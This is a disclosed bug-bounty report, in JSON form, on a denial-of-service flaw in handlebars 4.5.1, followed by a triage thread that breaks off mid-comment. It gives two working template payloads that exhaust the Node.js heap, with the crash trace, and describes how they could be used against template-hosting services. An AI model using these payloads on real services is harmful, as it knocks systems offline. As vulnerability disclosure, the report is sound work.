{"id":726364,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83MjYzNjQ=","url":"https://hackerone.com/reports/726364","title":"Crash Node.js process from handlebars using a small and simple source","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2019-10-31T13:23:37.637Z","submitted_at":"2019-10-31T13:23:37.637Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"macasun","url":"/macasun","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/iCmYFpL1XoWHiQKcBiZ21XZ2/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":23949,"url":"https://hackerone.com/nodejs-ecosystem","handle":"nodejs-ecosystem","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Node.js third-party modules","twitter_handle":"","website":"https://nodejs.org/en/security/","about":"This program is used to handle vulnerabilities in the Node.js ecosystem."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2020-04-27T22:13:11.436Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2020-04-27T22:08:54.341Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"I would like to report Denial of service in handlebars.\nIt allows an attacker to crush Node.js process with a small and simple source.\n\n# Module\n\n**module name:** handlebars\n**version:** 4.5.1\n**npm page:** `https://www.npmjs.com/package/handlebars`\n\n## Module Description\n\nHandlebars.js is an extension to the Mustache templating language created by Chris Wanstrath. Handlebars.js and Mustache are both logicless templating languages that keep the view and the code separated like we all know they should be.\n\n## Module Stats\n\n9,223,382 downloads/week\n\n# Vulnerability\n\n## Vulnerability Description\n\nBy default Node.js limiting the max heap size to 700 MB or 1400MB on 32 and 64-bit platforms respectively. When the process consumes all available memory, it crashes. Handlebars doesn't validate the size of the context, so it's possible to create a very big string (using `String#repeat`) or a very big array (using `Array.push`), and concatenate a string or join an array to crash Node.js process. In theory, this exploit will crash node.js process that was started with increased memory limit: `--max-old-space-size=\u003cmemory-size\u003e`. \n\n## Steps To Reproduce:\n\nThere are three possible variants of the exploit:\n1. Generate a big string (500Mb) and call `String#concat` on it (the payload size is 124b).\n2. Declare a small string (100b), convert it to array using `String#split` and call thousands of `Array#push/Array#join` (the payload is 88Kb).\n3. Declare a medium size string (10Kb), convert it to array using `String#split` and call hundreds of `Array#push/Array#join` (the payload is 18Kb).\n\n1. The exploit doesn't require input context, it creates everything inside the source.\n2. Create a big size string using `String#repeat`.\n3. Concatenate string with itself.\n4. Compile and run template.\n5. Process crashed.\n\nVariant #1. Generate a big string (500Mb) and call `String#concat` on it:\n```\nconst handlebars = require('handlebars');\n\nlet source = `\n{{#with 'a' as |s0|}}\n  {{#with (s0.repeat 500000000) as |s|}}\n    {{s.concat s}}\n    {{s.concat s}}\n  {{/with}}\n{{/with}}\n`;\n\nlet template = handlebars.compile(source);\ntemplate();\n```\n\nVariant #2. Declare a small string (100b), convert it to array using `String#split` and call thousands of `Array#push/Array#join`:\n```\nconst handlebars = require('handlebars');\n\nlet sourceHeader = `\n{{#with 'ssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss' as |s|}}\n  {{#with s.split as |a|}}\n`;\nlet sourceFooter = `\n  {{/with}}\n{{/with}}\n`;\nlet sourceBody = '{{a.push s}}{{a.join}}'.repeat(10 ** 3 * 4);\nlet payload = sourceHeader + sourceBody + sourceFooter;\n\nlet template = handlebars.compile(payload);\ntemplate();\n```\n\nIn both cases Node.js process crashes:\n```\n\u003c--- Last few GCs ---\u003e\n\n[11741:0x32299b0]     3929 ms: Mark-sweep 1245.6 (1426.4) -\u003e 1245.6 (1425.4) MB, 33.7 / 0.0 ms  (average mu = 0.685, current mu = 0.001) last resort GC in old space requested\n[11741:0x32299b0]     3963 ms: Mark-sweep 1245.6 (1425.4) -\u003e 1245.6 (1425.4) MB, 34.4 / 0.0 ms  (average mu = 0.501, current mu = 0.001) last resort GC in old space requested\n\n\u003c--- JS stacktrace ---\u003e\n\n==== JS stack trace =========================================\n\n    0: ExitFrame [pc: 0xc1315dbe1d]\nSecurity context: 0x2eee53b9e6e1 \u003cJSObject\u003e\n    1: DoJoin(aka DoJoin) [0x2eee53b85e89] [native array.js:~87] [pc=0xc131892da0](this=0x2b1e3fd026f1 \u003cundefined\u003e,l=0x0378b7e7e3e9 \u003cJSArray[6647]\u003e,m=6647,A=0x2b1e3fd028c9 \u003ctrue\u003e,w=0x2eee53bdc0d9 \u003cString[1]: ,\u003e,v=0x2b1e3fd029a1 \u003cfalse\u003e)\n    2: Join(aka Join) [0x2eee53b85ed9] [native array.js:1] [bytecode=0xc562a657d09 offset=71](this=0x2b1e3fd026f1 \u003cundefined\u003e...\n\nFATAL ERROR: CALL_AND_RETRY_LAST Allocation failed - JavaScript heap out of memory\n 1: 0x8dc1c0 node::Abort() [node]\n 2: 0x8dc20c  [node]\n 3: 0xad60ae v8::Utils::ReportOOMFailure(v8::internal::Isolate*, char const*, bool) [node]\n 4: 0xad62e4 v8::internal::V8::FatalProcessOutOfMemory(v8::internal::Isolate*, char const*, bool) [node]\n 5: 0xec3972  [node]\n 6: 0xed318f v8::internal::Heap::AllocateRawWithRetryOrFail(int, v8::internal::AllocationSpace, v8::internal::AllocationAlignment) [node]\n 7: 0xea2d3b v8::internal::Factory::NewRawTwoByteString(int, v8::internal::PretenureFlag) [node]\n 8: 0x1191338 v8::internal::Runtime_StringBuilderJoin(int, v8::internal::Object**, v8::internal::Isolate*) [node]\n 9: 0xc1315dbe1d \nAborted (core dumped\n```\n\n## Patch\n\nValidate the size of the context before calling any of its functions.\n1. If context is a string, validate that its length doesn't exceed some logical value (100Kb for example).\n2. If context is an array, validate that its size doesn't exceed some logical value (500 elements for example) and sum of all element's values less than logical value (10Kb for example).\n\n## Supporting Material/References:\n\n- Ubuntu 18.04.3\n- node 10.15.1\n- npm 6.4.1\n\n# Wrap up\n\n- I contacted the maintainer to let them know: [N] \n- I opened an issue in the related repository: [N] \n\nBest regards,\nAlexander\n\n## Impact\n\nAn attacker is able to crash Node.js process.","vulnerability_information_html":"\u003cp\u003eI would like to report Denial of service in handlebars.\u003cbr\u003e\nIt allows an attacker to crush Node.js process with a small and simple source.\u003c/p\u003e\n\n\u003ch1 id=\"module\"\u003eModule\u003c/h1\u003e\n\n\u003cp\u003e\u003cstrong\u003emodule name:\u003c/strong\u003e handlebars\u003cbr\u003e\n\u003cstrong\u003eversion:\u003c/strong\u003e 4.5.1\u003cbr\u003e\n\u003cstrong\u003enpm page:\u003c/strong\u003e \u003ccode\u003ehttps://www.npmjs.com/package/handlebars\u003c/code\u003e\u003c/p\u003e\n\n\u003ch2 id=\"module-description\"\u003eModule Description\u003c/h2\u003e\n\n\u003cp\u003eHandlebars.js is an extension to the Mustache templating language created by Chris Wanstrath. Handlebars.js and Mustache are both logicless templating languages that keep the view and the code separated like we all know they should be.\u003c/p\u003e\n\n\u003ch2 id=\"module-stats\"\u003eModule Stats\u003c/h2\u003e\n\n\u003cp\u003e9,223,382 downloads/week\u003c/p\u003e\n\n\u003ch1 id=\"vulnerability\"\u003eVulnerability\u003c/h1\u003e\n\n\u003ch2 id=\"vulnerability-description\"\u003eVulnerability Description\u003c/h2\u003e\n\n\u003cp\u003eBy default Node.js limiting the max heap size to 700 MB or 1400MB on 32 and 64-bit platforms respectively. When the process consumes all available memory, it crashes. Handlebars doesn\u0026#39;t validate the size of the context, so it\u0026#39;s possible to create a very big string (using \u003ccode\u003eString#repeat\u003c/code\u003e) or a very big array (using \u003ccode\u003eArray.push\u003c/code\u003e), and concatenate a string or join an array to crash Node.js process. In theory, this exploit will crash node.js process that was started with increased memory limit: \u003ccode\u003e--max-old-space-size=\u0026lt;memory-size\u0026gt;\u003c/code\u003e. \u003c/p\u003e\n\n\u003ch2 id=\"steps-to-reproduce\"\u003eSteps To Reproduce:\u003c/h2\u003e\n\n\u003cp\u003eThere are three possible variants of the exploit:\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eGenerate a big string (500Mb) and call \u003ccode\u003eString#concat\u003c/code\u003e on it (the payload size is 124b).\u003c/li\u003e\n\u003cli\u003eDeclare a small string (100b), convert it to array using \u003ccode\u003eString#split\u003c/code\u003e and call thousands of \u003ccode\u003eArray#push/Array#join\u003c/code\u003e (the payload is 88Kb).\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eDeclare a medium size string (10Kb), convert it to array using \u003ccode\u003eString#split\u003c/code\u003e and call hundreds of \u003ccode\u003eArray#push/Array#join\u003c/code\u003e (the payload is 18Kb).\u003c/p\u003e\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eThe exploit doesn\u0026#39;t require input context, it creates everything inside the source.\u003c/p\u003e\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eCreate a big size string using \u003ccode\u003eString#repeat\u003c/code\u003e.\u003c/p\u003e\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eConcatenate string with itself.\u003c/p\u003e\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eCompile and run template.\u003c/p\u003e\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eProcess crashed.\u003c/p\u003e\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003eVariant #1. Generate a big string (500Mb) and call \u003ccode\u003eString#concat\u003c/code\u003e on it:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003econst handlebars = require(\u0026#39;handlebars\u0026#39;);\n\nlet source = `\n{{#with \u0026#39;a\u0026#39; as |s0|}}\n  {{#with (s0.repeat 500000000) as |s|}}\n    {{s.concat s}}\n    {{s.concat s}}\n  {{/with}}\n{{/with}}\n`;\n\nlet template = handlebars.compile(source);\ntemplate();\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eVariant #2. Declare a small string (100b), convert it to array using \u003ccode\u003eString#split\u003c/code\u003e and call thousands of \u003ccode\u003eArray#push/Array#join\u003c/code\u003e:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003econst handlebars = require(\u0026#39;handlebars\u0026#39;);\n\nlet sourceHeader = `\n{{#with \u0026#39;ssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss\u0026#39; as |s|}}\n  {{#with s.split as |a|}}\n`;\nlet sourceFooter = `\n  {{/with}}\n{{/with}}\n`;\nlet sourceBody = \u0026#39;{{a.push s}}{{a.join}}\u0026#39;.repeat(10 ** 3 * 4);\nlet payload = sourceHeader + sourceBody + sourceFooter;\n\nlet template = handlebars.compile(payload);\ntemplate();\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eIn both cases Node.js process crashes:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e\u0026lt;--- Last few GCs ---\u0026gt;\n\n[11741:0x32299b0]     3929 ms: Mark-sweep 1245.6 (1426.4) -\u0026gt; 1245.6 (1425.4) MB, 33.7 / 0.0 ms  (average mu = 0.685, current mu = 0.001) last resort GC in old space requested\n[11741:0x32299b0]     3963 ms: Mark-sweep 1245.6 (1425.4) -\u0026gt; 1245.6 (1425.4) MB, 34.4 / 0.0 ms  (average mu = 0.501, current mu = 0.001) last resort GC in old space requested\n\n\u0026lt;--- JS stacktrace ---\u0026gt;\n\n==== JS stack trace =========================================\n\n    0: ExitFrame [pc: 0xc1315dbe1d]\nSecurity context: 0x2eee53b9e6e1 \u0026lt;JSObject\u0026gt;\n    1: DoJoin(aka DoJoin) [0x2eee53b85e89] [native array.js:~87] [pc=0xc131892da0](this=0x2b1e3fd026f1 \u0026lt;undefined\u0026gt;,l=0x0378b7e7e3e9 \u0026lt;JSArray[6647]\u0026gt;,m=6647,A=0x2b1e3fd028c9 \u0026lt;true\u0026gt;,w=0x2eee53bdc0d9 \u0026lt;String[1]: ,\u0026gt;,v=0x2b1e3fd029a1 \u0026lt;false\u0026gt;)\n    2: Join(aka Join) [0x2eee53b85ed9] [native array.js:1] [bytecode=0xc562a657d09 offset=71](this=0x2b1e3fd026f1 \u0026lt;undefined\u0026gt;...\n\nFATAL ERROR: CALL_AND_RETRY_LAST Allocation failed - JavaScript heap out of memory\n 1: 0x8dc1c0 node::Abort() [node]\n 2: 0x8dc20c  [node]\n 3: 0xad60ae v8::Utils::ReportOOMFailure(v8::internal::Isolate*, char const*, bool) [node]\n 4: 0xad62e4 v8::internal::V8::FatalProcessOutOfMemory(v8::internal::Isolate*, char const*, bool) [node]\n 5: 0xec3972  [node]\n 6: 0xed318f v8::internal::Heap::AllocateRawWithRetryOrFail(int, v8::internal::AllocationSpace, v8::internal::AllocationAlignment) [node]\n 7: 0xea2d3b v8::internal::Factory::NewRawTwoByteString(int, v8::internal::PretenureFlag) [node]\n 8: 0x1191338 v8::internal::Runtime_StringBuilderJoin(int, v8::internal::Object**, v8::internal::Isolate*) [node]\n 9: 0xc1315dbe1d \nAborted (core dumped\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"patch\"\u003ePatch\u003c/h2\u003e\n\n\u003cp\u003eValidate the size of the context before calling any of its functions.\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eIf context is a string, validate that its length doesn\u0026#39;t exceed some logical value (100Kb for example).\u003c/li\u003e\n\u003cli\u003eIf context is an array, validate that its size doesn\u0026#39;t exceed some logical value (500 elements for example) and sum of all element\u0026#39;s values less than logical value (10Kb for example).\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003ch2 id=\"supporting-material-references\"\u003eSupporting Material/References:\u003c/h2\u003e\n\n\u003cul\u003e\n\u003cli\u003eUbuntu 18.04.3\u003c/li\u003e\n\u003cli\u003enode 10.15.1\u003c/li\u003e\n\u003cli\u003enpm 6.4.1\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch1 id=\"wrap-up\"\u003eWrap up\u003c/h1\u003e\n\n\u003cul\u003e\n\u003cli\u003eI contacted the maintainer to let them know: [N] \u003c/li\u003e\n\u003cli\u003eI opened an issue in the related repository: [N] \u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eBest regards,\u003cbr\u003e\nAlexander\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eAn attacker is able to crash Node.js process.\u003c/p\u003e\n","weakness":{"id":48,"name":"Denial of Service"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2020-05-27T22:08:54.442Z","allow_singular_disclosure_after":-18606807.998843502,"singular_disclosure_allowed":true,"vote_count":0,"voters":[],"severity":{"rating":"medium","score":6.5,"author_type":"Team","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"none","user_interaction":"required","scope":"unchanged","confidentiality":"none","integrity":"high","availability":"none"}},"structured_scope":{"databaseId":24624,"asset_type":"SOURCE_CODE","asset_identifier":"handlebars","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":6196816,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @amac,\n\nThank you for your submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.\n\nKind regards,\n@sodacan\n","markdown_message":"\u003cp\u003eHi \u003ca href=\"/amac\"\u003e@amac\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThank you for your submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.\u003c/p\u003e\n\n\u003cp\u003eKind regards,\u003cbr\u003e\n\u003ca href=\"/sodacan\"\u003e@sodacan\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2019-11-01T22:01:40.379Z","updated_at":"2019-11-01T22:01:40.379Z","actor":{"username":"sodacan","cleared":false,"url":"/sodacan","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/397/342/f09b69d30e08f05bbd6f12bf02200844bdf46f11_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6206418,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@amac\nThanks for your patience on this. The H1 team is still reviewing your report and will get back to you with any questions or comments.\n@sodacan","markdown_message":"\u003cp\u003e\u003ca href=\"/amac\"\u003e@amac\u003c/a\u003e\u003cbr\u003e\nThanks for your patience on this. The H1 team is still reviewing your report and will get back to you with any questions or comments.\u003cbr\u003e\n\u003ca href=\"/sodacan\"\u003e@sodacan\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2019-11-04T00:07:33.460Z","updated_at":"2019-11-04T00:07:33.460Z","actor":{"username":"sodacan","cleared":false,"url":"/sodacan","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/397/342/f09b69d30e08f05bbd6f12bf02200844bdf46f11_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6358921,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @sodacan,\nAny progress on this?","markdown_message":"\u003cp\u003eHi \u003ca href=\"/sodacan\"\u003e@sodacan\u003c/a\u003e,\u003cbr\u003e\nAny progress on this?\u003c/p\u003e\n","automated_response":false,"created_at":"2019-11-20T15:12:39.502Z","updated_at":"2019-11-20T15:12:39.502Z","actor":{"username":"macasun","cleared":false,"url":"/macasun","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/iCmYFpL1XoWHiQKcBiZ21XZ2/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6364263,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @amac,\nThank you for your extended patience on this report it has mistakenly fallen through the cracks. It is still under review by our team and is now a top priority for review. \n@sodacan","markdown_message":"\u003cp\u003eHi \u003ca href=\"/amac\"\u003e@amac\u003c/a\u003e,\u003cbr\u003e\nThank you for your extended patience on this report it has mistakenly fallen through the cracks. It is still under review by our team and is now a top priority for review. \u003cbr\u003e\n\u003ca href=\"/sodacan\"\u003e@sodacan\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2019-11-21T00:49:36.614Z","updated_at":"2019-11-21T00:49:36.614Z","actor":{"username":"sodacan","cleared":false,"url":"/sodacan","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/397/342/f09b69d30e08f05bbd6f12bf02200844bdf46f11_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6424596,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2019-11-27T20:59:27.074Z","updated_at":"2019-11-27T20:59:27.074Z","additional_data":{"old_severity":"High","new_severity":"Medium (6.5)","old_severity_id":552741,"new_severity_id":577219},"actor":{"username":"sodacan","cleared":false,"url":"/sodacan","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/397/342/f09b69d30e08f05bbd6f12bf02200844bdf46f11_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6424597,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hello @amac,\n\nThank you for your submission! We were able to validate your report, and have submitted it to the appropriate remediation team for review. They will let us know the final ruling on this report, and when/if a fix will be implemented. Please note that the status and severity are subject to change.\n\nRegards,\n@sodacan\n","markdown_message":"\u003cp\u003eHello \u003ca href=\"/amac\"\u003e@amac\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThank you for your submission! We were able to validate your report, and have submitted it to the appropriate remediation team for review. They will let us know the final ruling on this report, and when/if a fix will be implemented. Please note that the status and severity are subject to change.\u003c/p\u003e\n\n\u003cp\u003eRegards,\u003cbr\u003e\n\u003ca href=\"/sodacan\"\u003e@sodacan\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2019-11-27T20:59:53.776Z","updated_at":"2019-11-27T20:59:53.776Z","actor":{"username":"sodacan","cleared":false,"url":"/sodacan","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/397/342/f09b69d30e08f05bbd6f12bf02200844bdf46f11_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6537727,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you for your report @amac. I see the findings as not a security issue since these are the APIs you are provided with and you need to use them securely. I don't see how this would count as a vulnerability so I lean towards resolving this report as not relevant.\n\nThat said, I reached out to the maintainers of handlebars and invited them to join the discussion and triage the issue. Perhaps we can resolve it as informative and an action item from the package maintainers will be to put a security disclaimer on the project's README.","markdown_message":"\u003cp\u003eThank you for your report \u003ca href=\"/amac\"\u003e@amac\u003c/a\u003e. I see the findings as not a security issue since these are the APIs you are provided with and you need to use them securely. I don\u0026#39;t see how this would count as a vulnerability so I lean towards resolving this report as not relevant.\u003c/p\u003e\n\n\u003cp\u003eThat said, I reached out to the maintainers of handlebars and invited them to join the discussion and triage the issue. Perhaps we can resolve it as informative and an action item from the package maintainers will be to put a security disclaimer on the project\u0026#39;s README.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-12-13T01:33:22.289Z","updated_at":"2019-12-13T01:33:22.289Z","actor":{"username":"lirantal","cleared":false,"url":"/lirantal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6538861,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @lirantal,\nThank you for your response.\n\nIs a DoS attack no longer a security issue?\n\nSome services use Handlebars as a template engine and provide access to it for end users. For example, Sendgrid - a communication platform for transactional and marketing email, uses Handlebars to create email templates. An attacker can create a template with the payload described above, and send several emails at the same time. This will crash **all running** Node.js. instances. SendGrid uses something like pm2 to restart crushed instances, so they will be restarted automatically, but it takes time, and the attacker can send more requests using some automation. When SendGrid developers will identify a problem using the logs, they won't be able to do anything to prevent this attack (even a complicated regexp for search `repeat`, `push`, `concat` strings in templates doesn't solve the problem), because the problem is inside Handlebars, it must ignore or control `repeat` function and the size of the context.\n\nPut a security disclaimer on the project's README will be as a red flag for black hackers: _use it to kill any server that uses Handlebars_.","markdown_message":"\u003cp\u003eHi \u003ca href=\"/lirantal\"\u003e@lirantal\u003c/a\u003e,\u003cbr\u003e\nThank you for your response.\u003c/p\u003e\n\n\u003cp\u003eIs a DoS attack no longer a security issue?\u003c/p\u003e\n\n\u003cp\u003eSome services use Handlebars as a template engine and provide access to it for end users. For example, Sendgrid - a communication platform for transactional and marketing email, uses Handlebars to create email templates. An attacker can create a template with the payload described above, and send several emails at the same time. This will crash \u003cstrong\u003eall running\u003c/strong\u003e Node.js. instances. SendGrid uses something like pm2 to restart crushed instances, so they will be restarted automatically, but it takes time, and the attacker can send more requests using some automation. When SendGrid developers will identify a problem using the logs, they won\u0026#39;t be able to do anything to prevent this attack (even a complicated regexp for search \u003ccode\u003erepeat\u003c/code\u003e, \u003ccode\u003epush\u003c/code\u003e, \u003ccode\u003econcat\u003c/code\u003e strings in templates doesn\u0026#39;t solve the problem), because the problem is inside Handlebars, it must ignore or control \u003ccode\u003erepeat\u003c/code\u003e function and the size of the context.\u003c/p\u003e\n\n\u003cp\u003ePut a security disclaimer on the project\u0026#39;s README will be as a red flag for black hackers: \u003cu\u003euse it to kill any server that uses Handlebars\u003c/u\u003e.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-12-13T07:10:39.371Z","updated_at":"2019-12-13T07:10:39.371Z","actor":{"username":"macasun","cleared":false,"url":"/macasun","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/iCmYFpL1XoWHiQKcBiZ21XZ2/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6542058,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Let's take Node.js's built-in `child_process` module. Would you file a command injection vulnerability for the `spawn()` API? Probably not as this is part of the API and by definition allows you to provide commands to it. I use the same rationale for this library. The Denial of Service vulnerability that affects a Node.js service if this library is used depends upon a bad usage of this library's API. Perhaps the template provided to handlebars is a trusted one that only comes from users, or maybe it doesn't but this is context dependent.\n\nThat said, if we were to classify the issue as a buffer overflow type (or perhaps CWE 400 https://cwe.mitre.org/data/definitions/400.htm - Uncontrolled Resource Consumption) then I think the security issue stands and is definitely applicable. In other words, the Denial of Service for a Node.js app is the result of issues in the library, not the cause.\n\nThanks for your diligent questioning @amac, I invited a member of the maintenance team and hope they'll be able to join in soon on the discussion.\n","markdown_message":"\u003cp\u003eLet\u0026#39;s take Node.js\u0026#39;s built-in \u003ccode\u003echild_process\u003c/code\u003e module. Would you file a command injection vulnerability for the \u003ccode\u003espawn()\u003c/code\u003e API? Probably not as this is part of the API and by definition allows you to provide commands to it. I use the same rationale for this library. The Denial of Service vulnerability that affects a Node.js service if this library is used depends upon a bad usage of this library\u0026#39;s API. Perhaps the template provided to handlebars is a trusted one that only comes from users, or maybe it doesn\u0026#39;t but this is context dependent.\u003c/p\u003e\n\n\u003cp\u003eThat said, if we were to classify the issue as a buffer overflow type (or perhaps CWE 400 \u003ca title=\"https://cwe.mitre.org/data/definitions/400.htm\" href=\"/redirect?url=https%3A%2F%2Fcwe.mitre.org%2Fdata%2Fdefinitions%2F400.htm\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://cwe.mitre.org/data/definitions/400.htm\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e - Uncontrolled Resource Consumption) then I think the security issue stands and is definitely applicable. In other words, the Denial of Service for a Node.js app is the result of issues in the library, not the cause.\u003c/p\u003e\n\n\u003cp\u003eThanks for your diligent questioning \u003ca href=\"/amac\"\u003e@amac\u003c/a\u003e, I invited a member of the maintenance team and hope they\u0026#39;ll be able to join in soon on the discussion.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-12-13T14:22:01.029Z","updated_at":"2019-12-13T14:22:01.029Z","actor":{"username":"lirantal","cleared":false,"url":"/lirantal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6544191,"is_internal":false,"editable":false,"type":"Activities::ExternalUserJoined","message":"","markdown_message":"","automated_response":false,"created_at":"2019-12-13T19:42:59.834Z","updated_at":"2019-12-13T19:42:59.834Z","actor":{"username":"knappi79","cleared":false,"url":"/knappi79","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6544242,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I think this is serious and it is a re-incarnation of other issues that have occured due to the possibility of prototype access.\nI tried to be cautious forbidding prototype access completely because of backwards compatibility issues. A fix of this particular issue should not be too difficult at the moment. We are attempting a more complete fix in version 5.0\n\n","markdown_message":"\u003cp\u003eI think 